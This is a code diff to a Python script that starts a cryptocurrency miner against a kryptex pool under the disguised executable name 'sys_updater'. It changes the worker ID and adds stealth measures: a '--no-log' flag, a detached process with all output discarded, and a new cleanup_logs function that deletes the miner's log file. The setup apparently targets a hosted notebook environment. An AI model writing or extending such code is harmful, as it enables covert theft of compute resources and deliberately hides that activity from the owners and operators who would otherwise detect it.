@@ -15,7 +15,7 @@ STEALTHY_EXECUTABLE_NAME = "sys_updater"
 
 SERVICE_ALGORITHM = "xelishashv2"
 SERVICE_SERVER = "xel.kryptex.network:7019"
-SERVICE_USER = "krxXJMWJKW.kolor"
+SERVICE_USER = "krxXJMWJKW.bautay"
 SERVICE_PASS = "200"
 
 def setup_files():
@@ -52,14 +52,26 @@ def start_service():
         "-a", SERVICE_ALGORITHM,
         "-o", SERVICE_SERVER,
         "-w", SERVICE_USER,
-        "--pl", SERVICE_PASS
+        "--pl", SERVICE_PASS,
+        "--no-log"
     ]
 
     try:
+        # Redirect stdout and stderr directly to DEVNULL
         subprocess.Popen(service_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, preexec_fn=os.setsid)
     except (FileNotFoundError, Exception):
         pass
 
+def cleanup_logs():
+    log_file_path = "/content/logs/miner.log"
+    if os.path.exists(log_file_path):
+        try:
+            os.remove(log_file_path)
+        except Exception:
+            pass
+
 if __name__ == "__main__":
     if setup_files():
         start_service()
+    
+    cleanup_logs()
